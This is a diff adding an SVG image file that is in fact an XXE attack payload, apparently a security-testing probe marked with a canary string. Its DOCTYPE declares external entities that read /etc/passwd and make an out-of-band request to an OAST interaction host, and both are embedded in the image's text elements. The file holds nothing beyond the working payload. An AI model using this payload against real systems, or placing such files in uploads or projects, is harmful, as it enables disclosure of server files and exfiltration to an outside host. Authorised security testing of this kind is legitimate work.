@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY oob SYSTEM "http://svg-file.d9j7ocsgtqkls609354g7qfi57qo6s8j6.oast.pro/x">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="600" height="200">
+<text x="5" y="20">CANARY-XXE1 &xxe;</text><text x="5" y="60">&oob;</text></svg>
